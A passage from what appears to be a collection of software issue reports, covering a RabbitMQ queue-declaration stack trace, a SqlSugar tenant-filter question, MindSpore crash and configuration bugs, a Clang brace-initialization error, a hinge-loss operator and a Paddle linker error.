com.rabbitmq.client.impl.AMQChannel.exnWrappingRpc(AMQChannel.java:141) ... 39 common frames omitted 2022-07-07 18:19:12.233 WARN [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.l.BlockingQueueConsumer] - Failed to declare queue: spring.gen-WIFiNrd2RTantI20TMMXgQ 2022-07-07 18:19:12.236 WARN [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.l.BlockingQueueConsumer] - Queue declaration failed; retries left=3 org.springframework.amqp.rabbit.listener.BlockingQueueConsumer$DeclarationException: Failed to declare queue(s):[spring.gen-WIFiNrd2RTantI20TMMXgQ] at org.springframework.amqp.rabbit.listener.BlockingQueueConsumer.attemptPassiveDeclarations(BlockingQueueConsumer.java:743) at org.springframework.amqp.rabbit.listener.BlockingQueueConsumer.passiveDeclarations(BlockingQueueConsumer.java:620) at org.springframework.amqp.rabbit.listener.BlockingQueueConsumer.start(BlockingQueueConsumer.java:607) at org.springframework.amqp.rabbit.listener.SimpleMessageListenerContainer$AsyncMessageProcessingConsumer.initialize(SimpleMessageListenerContainer.java:1348) at org.springframework.amqp.rabbit.listener.SimpleMessageListenerContainer$AsyncMessageProcessingConsumer.run(SimpleMessageListenerContainer.java:1193) at java.lang.Thread.run(Thread.java:748) Caused by: java.io.IOException: null at com.rabbitmq.client.impl.AMQChannel.wrap(AMQChannel.java:129) at com.rabbitmq.client.impl.AMQChannel.wrap(AMQChannel.java:125) at com.rabbitmq.client.impl.AMQChannel.exnWrappingRpc(AMQChannel.java:147) at com.rabbitmq.client.impl.ChannelN.queueDeclarePassive(ChannelN.java:1012) at com.rabbitmq.client.impl.ChannelN.queueDeclarePassive(ChannelN.java:46) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.amqp.rabbit.connection.CachingConnectionFactory$CachedChannelInvocationHandler.invoke(CachingConnectionFactory.java:1157) at com.sun.proxy.$Proxy161.queueDeclarePassive(Unknown Source) at org.springframework.amqp.rabbit.listener.BlockingQueueConsumer.attemptPassiveDeclarations(BlockingQueueConsumer.java:721) ... 5 common frames omitted Caused by: com.rabbitmq.client.ShutdownSignalException: channel error; protocol method: #method&lt;channel.close&gt;(reply-code=404, reply-text=NOT_FOUND - no queue 'spring.gen-WIFiNrd2RTantI20TMMXgQ' in vhost 'jeepay_vh', class-id=50, method-id=10) at com.rabbitmq.utility.ValueOrException.getValue(ValueOrException.java:66) at com.rabbitmq.utility.BlockingValueOrException.uninterruptibleGetValue(BlockingValueOrException.java:36) at com.rabbitmq.client.impl.AMQChannel$BlockingRpcContinuation.getReply(AMQChannel.java:502) at com.rabbitmq.client.impl.AMQChannel.privateRpc(AMQChannel.java:293) at com.rabbitmq.client.impl.AMQChannel.exnWrappingRpc(AMQChannel.java:141) ... 14 common frames omitted Caused by: com.rabbitmq.client.ShutdownSignalException: channel error; protocol method: #method&lt;channel.close&gt;(reply-code=404, reply-text=NOT_FOUND - no queue 'spring.gen-WIFiNrd2RTantI20TMMXgQ' in vhost 'jeepay_vh', class-id=50, method-id=10) at com.rabbitmq.client.impl.ChannelN.asyncShutdown(ChannelN.java:517) at com.rabbitmq.client.impl.ChannelN.processAsync(ChannelN.java:341) at com.rabbitmq.client.impl.AMQChannel.handleCompleteInboundCommand(AMQChannel.java:182) at com.rabbitmq.client.impl.AMQChannel.handleFrame(AMQChannel.java:114) at com.rabbitmq.client.impl.AMQConnection.readFrame(AMQConnection.java:739) at com.rabbitmq.client.impl.AMQConnection.access$300(AMQConnection.java:47) at com.rabbitmq.client.impl.AMQConnection$MainLoop.run(AMQConnection.java:666) ... 1 common frames omitted 2022-07-07 18:19:17.251 WARN [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.l.BlockingQueueConsumer] - Failed to declare queue: spring.gen-WIFiNrd2RTantI20TMMXgQ 2022-07-07 18:19:17.251 WARN [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.l.BlockingQueueConsumer] - Queue declaration failed; retries left=2 org.springframework.amqp.rabbit.listener.BlockingQueueConsumer$DeclarationException: Failed to declare queue(s):[spring.gen-WIFiNrd2RTantI20TMMXgQ] at org.springframework.amqp.rabbit.listener.BlockingQueueConsumer.attemptPassiveDeclarations(BlockingQueueConsumer.java:743) at org.springframework.amqp.rabbit.listener.BlockingQueueConsumer.passiveDeclarations(BlockingQueueConsumer.java:620) at org.springframework.amqp.rabbit.listener.BlockingQueueConsumer.start(BlockingQueueConsumer.java:607) at org.springframework.amqp.rabbit.listener.SimpleMessageListenerContainer$AsyncMessageProcessingConsumer.initialize(SimpleMessageListenerContainer.java:1348) at org.springframework.amqp.rabbit.listener.SimpleMessageListenerContainer$AsyncMessageProcessingConsumer.run(SimpleMessageListenerContainer.java:1193) at java.lang.Thread.run(Thread.java:748) Caused by: java.io.IOException: null at com.rabbitmq.client.impl.AMQChannel.wrap(AMQChannel.java:129) at com.rabbitmq.client.impl.AMQChannel.wrap(AMQChannel.java:125) at com.rabbitmq.client.impl.AMQChannel.exnWrappingRpc(AMQChannel.java:147) at com.rabbitmq.client.impl.ChannelN.queueDeclarePassive(ChannelN.java:1012) at com.rabbitmq.client.impl.ChannelN.queueDeclarePassive(ChannelN.java:46) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.amqp.rabbit.connection.CachingConnectionFactory$CachedChannelInvocationHandler.invoke(CachingConnectionFactory.java:1157) at com.sun.proxy.$Proxy161.queueDeclarePassive(Unknown Source) at org.springframework.amqp.rabbit.listener.BlockingQueueConsumer.attemptPassiveDeclarations(BlockingQueueConsumer.java:721) ... 5 common frames omitted Caused by: com.rabbitmq.client.ShutdownSignalException: channel error; protocol method: #method&lt;channel.close&gt;(reply-code=404, reply-text=NOT_FOUND - no queue 'spring.gen-WIFiNrd2RTantI20TMMXgQ' in vhost 'jeepay_vh', class-id=50, method-id=10) at com.rabbitmq.utility.ValueOrException.getValue(ValueOrException.java:66) at com.rabbitmq.utility.BlockingValueOrException.uninterruptibleGetValue(BlockingValueOrException.java:36) at com.rabbitmq.client.impl.AMQChannel$BlockingRpcContinuation.getReply(AMQChannel.java:502) at com.rabbitmq.client.impl.AMQChannel.privateRpc(AMQChannel.java:293) at com.rabbitmq.client.impl.AMQChannel.exnWrappingRpc(AMQChannel.java:141) ... 14 common frames omitted Caused by: com.rabbitmq.client.ShutdownSignalException: channel error; protocol method: #method&lt;channel.close&gt;(reply-code=404, reply-text=NOT_FOUND - no queue 'spring.gen-WIFiNrd2RTantI20TMMXgQ' in vhost 'jeepay_vh', class-id=50, method-id=10) at com.rabbitmq.client.impl.ChannelN.asyncShutdown(ChannelN.java:517) at com.rabbitmq.client.impl.ChannelN.processAsync(ChannelN.java:341) at com.rabbitmq.client.impl.AMQChannel.handleCompleteInboundCommand(AMQChannel.java:182) at com.rabbitmq.client.impl.AMQChannel.handleFrame(AMQChannel.java:114) at com.rabbitmq.client.impl.AMQConnection.readFrame(AMQConnection.java:739) at com.rabbitmq.client.impl.AMQConnection.access$300(AMQConnection.java:47) at com.rabbitmq.client.impl.AMQConnection$MainLoop.run(AMQConnection.java:666) ... 1 common frames omitted 2022-07-07 18:19:22.267 WARN [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.l.BlockingQueueConsumer] - Failed to declare queue: spring.gen-WIFiNrd2RTantI20TMMXgQ 2022-07-07 18:19:22.268 WARN [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.l.BlockingQueueConsumer] - Queue declaration failed; retries left=1 org.springframework.amqp.rabbit.listener.BlockingQueueConsumer$DeclarationException: Failed to declare queue(s):[spring.gen-WIFiNrd2RTantI20TMMXgQ] at org.springframework.amqp.rabbit.listener.BlockingQueueConsumer.attemptPassiveDeclarations(BlockingQueueConsumer.java:743) at org.springframework.amqp.rabbit.listener.BlockingQueueConsumer.passiveDeclarations(BlockingQueueConsumer.java:620) at org.springframework.amqp.rabbit.listener.BlockingQueueConsumer.start(BlockingQueueConsumer.java:607) at org.springframework.amqp.rabbit.listener.SimpleMessageListenerContainer$AsyncMessageProcessingConsumer.initialize(SimpleMessageListenerContainer.java:1348) at org.springframework.amqp.rabbit.listener.SimpleMessageListenerContainer$AsyncMessageProcessingConsumer.run(SimpleMessageListenerContainer.java:1193) at jav"
过滤器中租户和组织过滤器无法生效,"缓存过滤器在queryFilterProvider 为null时才配置过滤器，但是此时用户还没有登录导致App.User?.FindFirst(ClaimConst.TenantId)?.Value 获取的就是null也就导致这个过滤器没有生效， 我尝试将配置过滤器的代码放到else中，但又会导致重复配置过滤器，不知道有没有更好的办法？   <code>: // 缓存处理过滤器 var queryFilterProvider = db.DataCache.Get&lt;QueryFilterProvider&gt;(config.ConfigId); if (queryFilterProvider == null) { // 配置实体假删除过滤器 SetDeletedEntityFilter(db); // 配置实体机构过滤器 SetOrgEntityFilter(db); // 配置自定义实体过滤器 SetCustomEntityFilter(db); // 配置租户实体过滤器 SetTenantEntityFilter(db); db.DataCache.Add(config.ConfigId, db.QueryFilter); } else { db.QueryFilter = queryFilterProvider; } /// &lt;summary&gt; /// 配置租户实体过滤器 /// &lt;/summary&gt; private static void SetTenantEntityFilter(SqlSugarScopeProvider db) { // 获取租户实体数据表集合 var dataEntityTypes = App.EffectiveTypes.Where(u =&gt; !u.IsInterface &amp;&amp; !u.IsAbstract &amp;&amp; u.IsClass &amp;&amp; u.BaseType == typeof(EntityTenant)); if (!dataEntityTypes.Any()) return; var tenantId = App.User?.FindFirst(ClaimConst.TenantId)?.Value; if (string.IsNullOrWhiteSpace(tenantId)) return; foreach (var dataEntityType in dataEntityTypes) { Expression&lt;Func&lt;EntityTenant, bool&gt;&gt; dynamicExpression = u =&gt; u.TenantId == long.Parse(tenantId); db.QueryFilter.Add(new TableFilterItem&lt;object&gt;(dataEntityType, dynamicExpression)); } }"
[CT][MS][Upsamplenearest3d]test report coredump when scales dtype is tuple[float] and input dtype is fp64 at cpu,"cpu后端 算子Upsamplenearest3d参数scales传tuple[float]，input dtype 是 fp64， 会coredump / 硬件环境: /device CPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph cpu后端执行测试用例 正确执行 cpu : ascend 报错   <code>: def test_upsamplenearest3d_attr_scales_tuple_float_fp64(): x = Tensor(np.random.randn(19, 20, 78, 512, 56), dtype=mstype.float64) fact = UpsampleNearest3dMock(attributes={'scales': (3.8, 4.1, 0.5)}, inputs=[x]) fact.forward_cmp() fact.grad_cmp() test_upsamplenearest3d.py Fatal Python error: Segmentation fault Thread 0x00007f5fe6baa740 (most recent call first): File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/mindspore/common/api.py"", line 711 in end_graph File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 600 in __call__ File ""/home/cao_test/MindSporeTest/share/utils.py"", line 182 in __call__ File ""/home/cao_test/MindSporeTest/share/ops/primitive/upsamplenearest3d_ops.py"", line 42 in forward_mindspore_impl File ""/home/cao_test/MindSporeTest/share/ops/primitive/upsamplenearest3d_ops.py"", line 85 in forward_cmp File ""/home/cao_test/MindSporeTest/operations/test_upsamplenearest3d.py"", line 110 in test_upsamplenearest3d_attr_scales_tuple_float_fp64 File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/high-caory/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/miniconda3/envs/high-caory/bin/pytest"", line 8 in &lt;module&gt; Segmentation fault (core dumped) def test_upsamplenearest3d_attr_scales_tuple_float_fp64(): x = Tensor(np.random.randn(19, 20, 78, 512, 56), dtype=mstype.float64) fact = UpsampleNearest3dMock(attributes={'scales': (3.8, 4.1, 0.5)}, inputs=[x]) &gt; fact.forward_cmp() E RuntimeError: mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_device_context.cc:464 PreprocessBeforeRunGraph] Preprocess faile d before run graph 6, E error msg: mindspore/ccsrc/plugin/device/ascend/hal/device/ascend_memory_manager.cc:96 MallocStaticMem] Fail to alloc memory, size: 528 85396992, memory statistics: E Device HBM memory size: 32768M E MindSpore Used memory size: 30684M E MindSpore memory base address: 0x120800000000 E Total Static Memory size: 29184M E Total Dynamic memory size: 0M E Dynamic memory size of this graph: 0M"
[CT][MS] cpu后端跑5G网络会大概率出现随机coredump.,"cpu后端跑5G网络会大概率出现随机coredump cpu后端跑5G网络会大概率出现随机coredump / 硬件环境: /device /CPU/ : -- MindSpore version : commit_id = ''[sha1]:2e784516,[branch]:(HEAD,mr-origin-44322)'' -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative /mode graph 外部提供的mae_aau_predict_test.zip cd retrains ; python api.py run pass   <code>: 2022-11-04 03:01:13.406 - 7676 - 140227592169280 - NAIE - INFO - api.py[line:99] - retrain_task - Current evaluation metrics of Model user_model_mh_5G_anhui_dist:{'mape': 1.5256418, 'mae': 0.057893295, 'mape_per': 1.0, 'open_close': 1.0, 'mae_per': 1.0} 2022-11-04 03:01:13.407 - 7676 - 140227592169280 - NAIE - INFO - api.py[line:100] - retrain_task - *************** Start HW Cloud retrain ************** 2022-11-04 03:01:13.408 - 7676 - 140227592169280 - NAIE - INFO - train_main.py[line:8] - by_train - -----&gt;&gt;train start&lt;&lt;----- 2022-11-04 03:01:13.411 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:919] - train_md_model - start to init TrainFeatureExtractor 2022-11-04 03:01:13.413 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:921] - train_md_model - start to create_features 2022-11-04 03:01:13.414 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:110] - load_ori_data - init cell_traffic data shape: (144000, 7) 2022-11-04 03:01:13.992 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:113] - load_ori_data - cell_traffic span: (Timestamp('2022-09-11 10:00:00'), Timestamp('2022-10-11 09:00:00')) 2022-11-04 03:01:13.996 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:131] - load_ori_data - data_period: DatetimeIndex(['2022-09-11 10:00:00', '2022-09-11 11:00:00',\n '2022-09-11 12:00:00', '2022-09-11 13:00:00',\n '2022-09-11 14:00:00', '2022-09-11 15:00:00',\n '2022-09-11 16:00:00', '2022-09-11 17:00:00',\n '2022-09-11 18:00:00', '2022-09-11 19:00:00',\n ...\n '2022-10-11 00:00:00', '2022-10-11 01:00:00',\n '2022-10-11 02:00:00', '2022-10-11 03:00:00',\n '2022-10-11 04:00:00', '2022-10-11 05:00:00',\n '2022-10-11 06:00:00', '2022-10-11 07:00:00',\n '2022-10-11 08:00:00', '2022-10-11 09:00:00'],\n dtype='datetime64[ns]', length=720, freq='60T') 2022-11-04 03:01:13.998 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:132] - load_ori_data - train_period: DatetimeIndex(['2022-09-11 10:00:00', '2022-09-11 11:00:00',\n '2022-09-11 12:00:00', '2022-09-11 13:00:00',\n '2022-09-11 14:00:00', '2022-09-11 15:00:00',\n '2022-09-11 16:00:00', '2022-09-11 17:00:00',\n '2022-09-11 18:00:00', '2022-09-11 19:00:00',\n ...\n '2022-10-04 03:00:00', '2022-10-04 04:00:00',\n '2022-10-04 05:00:00', '2022-10-04 06:00:00',\n '2022-10-04 07:00:00', '2022-10-04 08:00:00',\n '2022-10-04 09:00:00', '2022-10-04 10:00:00',\n '2022-10-04 11:00:00', '2022-10-04 12:00:00'],\n dtype='datetime64[ns]', length=555, freq='60T') /home/zhujunan/temp3/mae_aau_predict_test/algorithm/train_data_process_x86.py:144: SettingWithCopyWarning: A value is trying to be set on a copy of a slice from a DataFrame See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy filters[np.isnan(filters)] = 9999 /home/zhujunan/temp3/mae_aau_predict_test/algorithm/train_data_process_x86.py:146: SettingWithCopyWarning: A value is trying to be set on a copy of a slice from a DataFrame See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy filters[np.isnan(data_train[self.target[i]])] = 9999 2022-11-04 03:01:14.048 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:152] - load_ori_data - Train start time: 2022-09-11 10:00:00 2022-11-04 03:01:14.049 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:153] - load_ori_data - Train columns: Index(['date_time', 'cgi', 'type', 'average_user', 'max_user',\n 'shutdown_duration', 'createdTime'],\n dtype='object') 2022-11-04 03:01:15.718 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:258] - create_static_real_features - Number of complete cgis: 100 2022-11-04 03:01:15.810 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:380] - create_obs_feature - columns:average_user 2022-11-04 03:01:22.447 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:380] - create_obs_feature - columns:max_user ############# None Time features shape======== (100, 720, 8) Obs features shape======== (100, 720, 2) labels shape======== (100, 720, 1) restore values shape======== (100, 2, 1) real features shape======== (100, 9) cat features shape======== (100, 1) 2022-11-04 03:01:29.355 - 7676 - 140227592169280 - NAIE - INFO - train_data_process_x86.py[line:612] - create_features - batch_size:128 model_config= {'model_name': 'user_model_mh_5G_anhui_dist', 'batch_size': 128, 'input_steps': 24, 'output_steps': 3, 'dropout_rate': 0.05, 'n_timefeatures': 8, 'n_obsfeatures': 2, 'use_attention': 'multi_head', 'hidden_layer_size': 128, 'n_static_cat': 1, 'n_static_real': 9, 'loss': 'mae', 'quantiles': [0.02, 0.05, 0.1, 0.15, 0.2, 0.25, 0.3, 0.35, 0.4, 0.45, 0.5, 0.55, 0.6, 0.65, 0.7, 0.75, 0.8, 0.85, 0.9, 0.95, 0.98], 'category_counts': [101], 'embedding_size': 8, 'learning_rate': 0.0001, 'early_stopping_patience': 5, 'LR_patience': 3, 'num_epochs': 1, 'steps_per_epoch': 526, 'validation_steps': 168, 'data_multiprocessing': False, 'n_workers': 1, 'output_size': 1, 'n_heads': 4, 'custom_steps': False, 'normalization': 'maxmin', 'normalize_target': True, 'use_log1p': True, 'lag_days': [0], 'online_mode': True} 2022-11-04 03:01:29.356 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:945] - train_md_model - start to create train dataset 2022-11-04 03:01:29.357 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:103] - create_dataset - else: start mindspore GeneratorDataset 2022-11-04 03:01:29.358 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:109] - create_dataset - else: mindspore GeneratorDataset end 2022-11-04 03:01:29.359 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:115] - create_dataset - input data after repeat 2022-11-04 03:01:29.360 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:955] - train_md_model - start to create val dataset 2022-11-04 03:01:29.361 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:103] - create_dataset - else: start mindspore GeneratorDataset 2022-11-04 03:01:29.362 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:109] - create_dataset - else: mindspore GeneratorDataset end 2022-11-04 03:01:29.362 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:115] - create_dataset - input data after repeat 2022-11-04 03:01:29.363 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:966] - train_md_model - after create val dataset 2022-11-04 03:01:29.365 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:972] - train_md_model - after dump file [WARNING] ME(7676:140227592169280,MainProcess):2022-11-04-03:01:29.366.644 [mindspore/nn/loss/loss.py:174] '_Loss' is deprecated from version 1.3 and will be removed in a future version, use 'LossBase' instead. 2022-11-04 03:01:29.743 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:997] - train_md_model - after build rnn model 2022-11-04 03:01:29.744 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:1009] - train_md_model - start calcu maeloss metric 2022-11-04 03:01:29.746 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:1025] - train_md_model - calcu maeloss metric close 2022-11-04 03:01:29.747 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:1028] - train_md_model - after my train with loss cell 2022-11-04 03:01:29.748 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:1033] - train_md_model - after my eval with loss cell 2022-11-04 03:01:30.130 - 7676 - 140227592169280 - NAIE - WARNING - train_md_model.py[line:1036] - train_md_model - after adam net opt [WARNING] ME(7676:140227592169280,MainProcess):2022-11-04-03:01:30.372.417 [mindspore/train/model.py:1091] For EvalCallBackNew callback, {'step_end', 'end', 'epoch_begin', 'epoch_end'} methods may not be supported in later version, Use methods prefixed with 'on_train' or 'on_eval' instead when using customized callbacks. Segmentation fault (core dumped)"
"[MS] set_auto_parallel_context(all_reduce_fusion_config=[8, 16]) doesn't take effect",": /device gpu /device cpu : -- MindSpore version :1.3.0.B005版本 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_setautoparallelcontext_check context.set_auto_parallel_context(all_reduce_fusion_config=[8, 16]) print(context.get_auto_parallel_context(""all_reduce_fusion_config"")) 设置all_reduce_fusion_config参数为[8,16]，但通过get_auto_parallel_context方法打印还是[] set_auto_parallel_context方法设置all_reduce_fusion_config参数不生效   <code>: INFO 2021-06-22 17:23:12 - root - base.py:__init__:27 - This is Ascend910 environment. INFO 2021-06-22 17:23:12 - root - base.py:print_hostname:170 - Host name is [10-90-55-95], Using device6 INFO 2021-06-22 17:23:12 - root - case_base.py:__init__:36 - env_dev is 0: 0代表A+X，1代表GPU(V100-PCIE)，2代表CPU，3代表A+K，4代表GPU(V100-SXM2) INFO 2021-06-22 17:23:13 - root - test_setautoparallelcontext_check.py:setup:12 - Set up in case. !!!!!!!!!!!!!!!!!!!!11 [] INFO 2021-06-22 17:23:13 - root - test_setautoparallelcontext_check.py:teardown:44 - Teardown case F ====================================================================== FAIL: test_scripts.mindspore.features.context.auto_parallel_context.test_setautoparallelcontext_check.Test_setautoparallel_check.test_run ---------------------------------------------------------------------- Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/nose/case.py"", line 198, in runTest self.test(*self.arg) File ""/home/jenkins/workspace/TDT_deployment/solution_test/test_scripts/mindspore/features/context/auto_parallel_context/test_setautoparallelcontext_check.py"", line 41, in test_run assert context.get_auto_parallel_context(""all_reduce_fusion_config"") == [8, 16] AssertionError: -------------------- &gt;&gt; begin captured logging &lt;&lt; -------------------- rootn9lWOJ0w: INFO: This is Ascend910 environment. rootn9lWOJ0w: INFO: Host name is [10-90-55-95], Using device6 rootn9lWOJ0w: INFO: env_dev is 0: 0代表A+X，1代表GPU(V100-PCIE)，2代表CPU，3代表A+K，4代表GPU(V100-SXM2) rootn9lWOJ0w: INFO: Set up in case. rootn9lWOJ0w: INFO: Teardown case --------------------- &gt;&gt; end captured logging &lt;&lt; --------------------- ---------------------------------------------------------------------- Ran 1 test in 0.003s FAILED (failures=1)"
Clang compile error: `suggest braces around initialization of subobject`,"In the current code, we are using C++11's new feature 'list initialization' to initialize and , like this: With GCC compiler, everything is well. However, if we use Clang and with , we are going to get the following error: This makes our newest code failing to be compiled on Mac. To fix this, we shall initialize with instead of See: https://stackoverflow.com/questions/31555584/why-is-clang-warning-suggest-braces-around-initialization-of-subobject-wmis   <code>: std::array Eigen::array auto arr = std::array&lt;int, 3&gt;({1,2,3}); -Werror,-Wmissing-braces error: suggest braces around initialization of subobject [-Werror,-Wmissing-braces] array {{...}} {}"
组件值转换统一化,组件值转换统一化 增加 扩展方法，方便讲字符串类型数据转换为任意类型数据   <code>: TryConvertTo
Add hinge loss op,"Resolves #5757: Optimize RoI Pooling layer by NEON intrinsics. by adding an implementation of a hinge loss operator for a binary classification scenario. The hinge loss for a prediction (x) and a target label (y), where x can be in (-inf, inf) and y can be +1 or -1, is: Future work: To extend this to multi-class setting More efficient implementation   <code>: hloss(x, y) = max(1 - y.x, 0)"
ZeroCopyTensor无法使用double类型,"使用C++部署预测模型，模型中参数是float64类型，预测程序中使用double类型，提示错误，找不到实例化的模板函数： paddle::test_induced_field(int, int)': /home/tao/work/tools/induced_vel_process/induced_vel_deploy/main.cpp:75: undefined reference to void paddle::ZeroCopyTensor::copy_to_cpu(double*)' collect2: error: ld returned 1 exit status CMakeFiles/induced_vel_deploy.dir/build.make:111: recipe for target 'induced_vel_deploy' failed make[2]: *** [induced_vel_deploy] Error 1 CMakeFiles/Makefile2:95: recipe for target 'CMakeFiles/induced_vel_deploy.dir/all' failed make[1]: *** [CMakeFiles/induced_vel_deploy.dir/all] Error 2 Makefile:103: recipe for target 'all' failed make: *** [all] Error 2` C++程序： `#include &lt;gflags/gflags.h&gt; #include &lt;glog/logging.h&gt; #include #include #include #include #include ""paddle/include/paddle_inference_api.h"" namespace paddle{ using paddle::AnalysisConfig; } int main() { std::cout &lt;&lt; ""Induced field model inference..."" &lt;&lt; std::endl; } `   <code>: Scanning dependencies of target induced_vel_deploy [ 50%] Building CXX object CMakeFiles/induced_vel_deploy.dir/main.cpp.o [100%] Linking CXX executable induced_vel_deploy CMakeFiles/induced_vel_deploy.dir/main.cpp.o: In function void paddle::ZeroCopyTensor::copy_from_cpu&lt;double&gt;(double const*)' /home/tao/work/tools/induced_vel_process/induced_vel_deploy/main.cpp:93: undefined reference to DEFINE_string(dirname, 